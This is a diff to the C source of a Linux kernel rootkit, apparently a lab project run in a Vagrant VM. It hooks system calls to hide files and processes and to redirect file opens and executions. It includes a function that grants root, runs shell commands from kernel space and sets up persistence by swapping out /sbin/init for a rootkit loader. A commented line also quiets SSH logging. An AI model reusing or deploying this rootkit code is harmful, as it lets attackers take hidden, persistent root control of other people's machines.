@@ -38,28 +38,34 @@ char hidePID[6] = "-1";
 
 // this is the c file which will replace /sbin/init
 // - it loads the rootkit then runs the original /sbin/init
-#define FILE_INIT_REPLACEMENT_C "/vagrant/start_rootkit.c"
+#define FILE_INIT_REPLACEMENT_C      "/vagrant/start_rootkit.c\0"
+#define FILE_INIT_REPLACEMENT_OUTPUT "/vagrant/start_rootkit\0"
 // #define FILE_INIT               "/sbin/init"
 // #define FILE_INIT_ORIGINAL      "/sbin/init_original"
 // #define FILE_INIT               "/vagrant/init_temp"
 // #define FILE_INIT_ORIGINAL      "/vagrant/init_temp_original"
-#define FILE_INIT               "/home/vagrant/fake_init"
-#define FILE_INIT_ORIGINAL      "/home/vagrant/fake_init_original"
+#define FILE_INIT               "/home/vagrant/pretend_sbin/fake_init\0"
+#define FILE_INIT_ORIGINAL      "/home/vagrant/pretend_sbin/fake_init_original\0"
 
 // 'map' for replacement open operations
 // e.g. trying to open dog.txt will get you red.txt instead
 // use linked list instead?
-const int   replacement_size     = 2;
-const char* replacement_keys[]   = { "/home/vagrant/redirect/dog.txt\0", "/home/vagrant/redirect/cat.txt\0" };
-const char* replacement_values[] = { "/home/vagrant/redirect/red.txt\0", "/home/vagrant/redirect/blue.txt\0" };
+const int   replacement_size     = 1;
+// const char* replacement_keys[]   = { "/home/vagrant/redirect/dog.txt\0", "/home/vagrant/redirect/cat.txt\0",  "/home/vagrant/redirect/test_prog\0" };
+// const char* replacement_values[] = { "/home/vagrant/redirect/red.txt\0", "/home/vagrant/redirect/blue.txt\0", "/home/vagrant/redirect/test_prog_redirect\0" };
+const char* replacement_keys[]   = { "/home/vagrant/pretend_sbin/fake_init\0" };
+const char* replacement_values[] = { "/home/vagrant/pretend_sbin/fake_init_original\0" };
 
+// 1 = custom boot-loader installed; run modified syscalls
+// 0 = custom boot-loader not yet installed; don't use modified syscalls
+int boot_loader_init = 0;
 
 asmlinkage int (*original_sysinfo)(struct sysinfo *);
 asmlinkage int (*original_kill)(pid_t, int);
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 asmlinkage int (*original_stat)(const char *path, struct stat *buf);
 asmlinkage int (*original_lstat)(const char *path, struct stat *buf);
-asmlinkage int (*original_open)(const char *pathname, int flags, mode_t mode);
+asmlinkage int (*original_open)(const char __user *pathname, int flags, mode_t mode);
 asmlinkage int (*original_openat)(int dirfd, const char* pathname, int flags, mode_t mode);
 asmlinkage int (*original_access)(const char *pathname, int mode);
 asmlinkage int (*original_execve)(const char *pathname, char* const argv[], char* const envp[]);
@@ -229,14 +235,14 @@ asmlinkage int hacked_stat(const char *path, struct stat *buf) {
         return -ENOENT;
     } else {
         // check for replacement as well
-        for (i = 0; i < replacement_size; i++) {
-            // check if pathname is in map
-            if (strncmp(path, replacement_keys[i], strlen(replacement_keys[i])) == 0) {
-                // redirect to replacement file
-                printk("tried to stat %s; redirecting stat from %s to %s...\n", path, replacement_keys[i], replacement_values[i]);
-                return original_stat(replacement_values[i], buf);
-            }
-        }
+        // for (i = 0; i < replacement_size; i++) {
+        //     // check if pathname is in map
+        //     if (strncmp(path, replacement_keys[i], strlen(replacement_keys[i])) == 0) {
+        //         // redirect to replacement file
+        //         printk("tried to stat %s; redirecting stat from %s to %s...\n", path, replacement_keys[i], replacement_values[i]);
+        //         return original_stat(replacement_values[i], buf);
+        //     }
+        // }
 
         return original_stat(path, buf);
     }
@@ -249,61 +255,48 @@ asmlinkage int hacked_lstat(const char *path, struct stat *buf) {
         return -ENOENT;
     } else {
         // check for replacement as well
-        for (i = 0; i < replacement_size; i++) {
-            // check if pathname is in map
-            if (strncmp(path, replacement_keys[i], strlen(replacement_keys[i])) == 0) {
-                // redirect to replacement file
-                printk("tried to lstat %s; redirecting lstat from %s to %s...\n", path, replacement_keys[i], replacement_values[i]);
-                return original_stat(replacement_values[i], buf);
-            }
-        }
+        // for (i = 0; i < replacement_size; i++) {
+        //     // check if pathname is in map
+        //     if (strncmp(path, replacement_keys[i], strlen(replacement_keys[i])) == 0) {
+        //         // redirect to replacement file
+        //         printk("tried to lstat %s; redirecting lstat from %s to %s...\n", path, replacement_keys[i], replacement_values[i]);
+        //         return original_stat(replacement_values[i], buf);
+        //     }
+        // }
 
         return original_lstat(path, buf);
     }
 }
 
-asmlinkage int hacked_open(const char* pathname, int flags, mode_t mode) {
-    // this can use relative path as well so we need to check only the filename.
-    // probs not great
-    const char* pathname_stripped = strip_filepath(pathname);
+asmlinkage int hacked_open(const char __user *pathname, int flags, mode_t mode) {
+    // if (boot_loader_init == 1) {
+        // this can use relative path as well so we need to check only the filename.
+        // probs not great
+        const char* pathname_stripped = strip_filepath(pathname);
 
-    // const char* to_send_ex = {'/', 'h', 'o', 'm', 'e',
-    //                           '/', 'v', 'a', 'g', 'r', 'a', 'n', 't',
-    //                           '/', 'r', 'e', 'd', 'i', 'r', 'e', 'c', 't',
-    //                           '/', 'd', 'o', 'g', '.', 't', 'x', 't'};
+        int i;
+        for (i = 0; i < replacement_size; i++) {
+            // check if pathname is in map
+            const char* replacement_key_stripped = strip_filepath(replacement_keys[i]);
+            if (strncmp(pathname_stripped, replacement_key_stripped, strlen(replacement_key_stripped)) == 0) {
+                // redirect to replacement file
+                printk("tried to open %s; redirecting open from %s to %s...\n", pathname, replacement_keys[i], replacement_values[i]);
 
-    // const char* to_send_ex = {'d', 'o', 'g', '.', 't', 'x', 't'};
+                // use user file system
+                mm_segment_t old_fs = get_fs();
+                set_fs(get_ds());
 
-    int i;
-    for (i = 0; i < replacement_size; i++) {
-        // check if pathname is in map
-        const char* replacement_key_stripped = strip_filepath(replacement_keys[i]);
-        if (strncmp(pathname, replacement_key_stripped, strlen(replacement_key_stripped)) == 0) {
-            // const char* replacement_value_stripped = strip_filepath(replacement_values[i]);
-            // redirect to replacement file
-            printk("tried to open %s; redirecting open from %s to %s...\n", pathname, replacement_keys[i], replacement_values[i]);
+                int fd = original_open(replacement_values[i], flags, mode);
 
-            printk("pathname: %s\n", pathname);
-            int j;
-            for (j = 0; j < 200; j++) {
-                printk("%c,", pathname[j]);
+                // return to kernel space
+                set_fs(old_fs);
+
+                return fd;
             }
-            printk("\n");
-
-            // int fd = original_open(to_send_ex, flags, mode);
-            int fd = original_open(replacement_values[i], flags, mode);
-            // int fd = original_open("/home/vagrant/banana", flags, mode | O_CREAT);
-            // perror("open");
-            printk("new fd is: %d\n", fd);
-            // printk("EISDIR is: %d\n", EISDIR);
-            return fd;
         }
-    }
+    // }
 
-    int fd = original_open(pathname, flags, mode);
-    printk("new (original) fd is: %d\n", fd);
-    // printk("error: %d\n", errno);
-    return fd;
+    return original_open(pathname, flags, mode);
 }
 
 asmlinkage int hacked_openat(int dirfd, const char *pathname, int flags, mode_t mode) {
@@ -340,25 +333,33 @@ asmlinkage int hacked_access(const char* pathname, int mode) {
 }
 
 asmlinkage int hacked_execve(const char* pathname, char* const argv[], char* const envp[]) {
-    int i;
-    for (i = 0; i < replacement_size; i++) {
-        // check if pathname is in map
-        if (strncmp(pathname, replacement_keys[i], strlen(replacement_keys[i])) == 0) {
-            // redirect to replacement file
-            printk("tried to execve %s; redirecting execve from %s to %s...\n", pathname, replacement_keys[i], replacement_values[i]);
-            return original_execve(replacement_values[i], argv, envp);
-        }
-    }
+    // if (boot_loader_init == 1) {
+    //     const char* pathname_stripped = strip_filepath(pathname);
+
+    //     int i;
+    //     for (i = 0; i < replacement_size; i++) {
+    //         // check if pathname is in map
+    //         const char* replacement_key_stripped = strip_filepath(replacement_keys[i]);
+    //         if (strncmp(pathname_stripped, replacement_key_stripped, strlen(replacement_key_stripped)) == 0) {
+    //             // redirect to replacement file
+    //             printk("tried to execve %s; redirecting execve from %s to %s...\n", pathname, replacement_keys[i], replacement_values[i]);
+
+    //             // use user file system
+    //             mm_segment_t old_fs = get_fs();
+    //             set_fs(get_ds());
+
+    //             int fd = original_execve(replacement_values[i], argv, envp);
+
+    //             // return to kernel space
+    //             set_fs(old_fs);
+
+    //             return fd;
+    //         }
+    //     }
+    // }
 
     return original_execve(pathname, argv, envp);
 }
-
-
-// stat takes pathname
-// + execve
-// + access
-
-
 
 void give_root(void)
 {
@@ -603,6 +604,7 @@ void set_file_permissions(const char* filename, int file_perms) {
 
 // runs a bash command
 int run_bash(char* command) {
+    // system("sudo sed -i 's/#\\?\\(LogLevel\\s*\\).*$/\\1 QUIET/' /etc/ssh/sshd_config");
     int res;
     char* argv[4];
     char* envp[4];
@@ -629,7 +631,9 @@ int run_bash(char* command) {
 //   doing file I/O is bad in kernel modules
 
 // also could have been done w/ other hidden program
-void add_to_reboot(void **sys_call_table) {
+
+// also could have just called execve instead?
+void add_to_reboot() {
     //clone_file("/home/vagrant/dog.txt", "/home/vagrant/dog_copy.txt");
     // clone_file("/home/vagrant/start_rootkit", "/home/vagrant/start_rootkit_copy");
 
@@ -669,31 +673,49 @@ void add_to_reboot(void **sys_call_table) {
 
     // REALLY NEED to check if file exists!
 
-    int ret;
+    // boot_loader_init = 0;
+    // we only need to replace one i.e. if the
+    // 'fake' file doesn't exist
+    // if (does_file_exist(FILE_INIT_ORIGINAL) == 0) {    
+        int ret;
 
-    // store file permissions of original init
-    umode_t orig_perms = get_file_permissions(FILE_INIT);
+        // store file permissions of original init
+        // umode_t orig_perms = get_file_permissions(FILE_INIT);
 
-    // rename original init
-    rename_file(FILE_INIT, FILE_INIT_ORIGINAL);
+        // rename original init
+        // rename_file(FILE_INIT, FILE_INIT_ORIGINAL);
 
-    // compile (/'copy' over replacement init)
-    char bash_compile[8 + strlen(FILE_INIT_REPLACEMENT_C) + strlen(FILE_INIT)];
-    sprintf(bash_compile, "gcc %s -o %s", FILE_INIT_REPLACEMENT_C, FILE_INIT);
-    printk("bash_compile: %s\n", bash_compile);
-    ret = run_bash(bash_compile);
+        // compile (/'copy' over replacement init)
+        // compile to same folder (kernel space)
+        // char bash_compile[8 + strlen(FILE_INIT_REPLACEMENT_C) + strlen(FILE_INIT_REPLACEMENT_OUTPUT)];
+        // sprintf(bash_compile, "gcc %s -o %s", FILE_INIT_REPLACEMENT_C, FILE_INIT_REPLACEMENT_OUTPUT);
+        // printk("bash_compile: %s\n", bash_compile);
+        // ret = run_bash(bash_compile);
+        //char bash_compile[8 + strlen(FILE_INIT_REPLACEMENT_C) + strlen(FILE_INIT_REPLACEMENT_OUTPUT)];
+        // sprintf(bash_compile, "gcc %s -o %s", FILE_INIT_REPLACEMENT_C, FILE_INIT_REPLACEMENT_OUTPUT);
+        // char* bash_compile = "gcc /home/vagrant/pretend_sbin/fake_init.c -o /home/vagrant/pretend_sbin/fake_init";
+        // printk("bash_compile: %s\n", bash_compile);
+        // ret = run_bash(bash_compile);
+        // ret = run_bash(bash_compile);
+        // then copy over to user space
+        //__copy_to_user(to, from, n bytes)
 
-    set_file_permissions(FILE_INIT, orig_perms);
-    set_file_permissions(FILE_INIT_ORIGINAL, 777777);
+        // set_file_permissions(FILE_INIT, orig_perms);
+        // set_file_permissions(FILE_INIT_ORIGINAL, 777777);
 
-    // set file permissions of original init to stored
-    // char bash_perms_init[7 + 10 + strlen(FILE_INIT) + 25];
-    // sprintf(bash_perms_init, "sudo chmod %o %s &> output.txt", orig_perms, FILE_INIT);
-    // printk("bash_perms_init: %s\n", bash_perms_init);
-    // ret = run_bash(bash_perms_init);
-    // // set file permissions of replacement init to stored
-    // char* bash_perms_repl[7 + 10 + strlen(FILE_INIT_ORIGINAL)];
-    // sprintf(bash_perms_repl, "chmod %o %s", orig_perms, FILE_INIT_ORIGINAL);
-    // printk("bash_perms_repl: %s\n", bash_perms_repl);
-    // ret = run_bash(bash_perms_repl);
+        // set file permissions of original init to stored
+        // char bash_perms_init[7 + 10 + strlen(FILE_INIT) + 25];
+        // sprintf(bash_perms_init, "sudo chmod %o %s &> output.txt", orig_perms, FILE_INIT);
+        // printk("bash_perms_init: %s\n", bash_perms_init);
+        // ret = run_bash(bash_perms_init);
+        // // set file permissions of replacement init to stored
+        // char* bash_perms_repl[7 + 10 + strlen(FILE_INIT_ORIGINAL)];
+        // sprintf(bash_perms_repl, "chmod %o %s", orig_perms, FILE_INIT_ORIGINAL);
+        // printk("bash_perms_repl: %s\n", bash_perms_repl);
+        // ret = run_bash(bash_perms_repl);
+
+        // boot_loader_init = 1;
+    // } else {
+    //     boot_loader_init = 1;
+    // }
 }
